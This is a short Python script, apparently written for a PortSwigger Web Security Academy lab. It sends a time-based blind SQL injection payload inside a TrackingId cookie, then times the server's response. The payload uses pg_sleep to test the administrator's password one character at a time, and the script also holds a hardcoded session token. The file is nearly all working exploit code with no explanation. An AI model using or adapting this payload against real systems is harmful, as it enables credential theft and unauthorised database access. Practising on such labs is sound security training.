import requests
import time

cookie = {
    "session": "9fqwdM0KEBvqex1OAwgKpxSP6MiYI6vS",
    "TrackingId": "HNWh0t0BDQRK9p3J' || (SELECT CASE WHEN (SUBSTRING(password,1,1) >= '-') THEN pg_sleep(6) ELSE pg_sleep(0) END FROM users WHERE username='administrator') --"
}

print(cookie)

b = time.time()
requests.get(
    "https://0a2c003e04797f6082b383bf00660086.web-security-academy.net/", cookies=cookie)

a = time.time()

print(a - b)
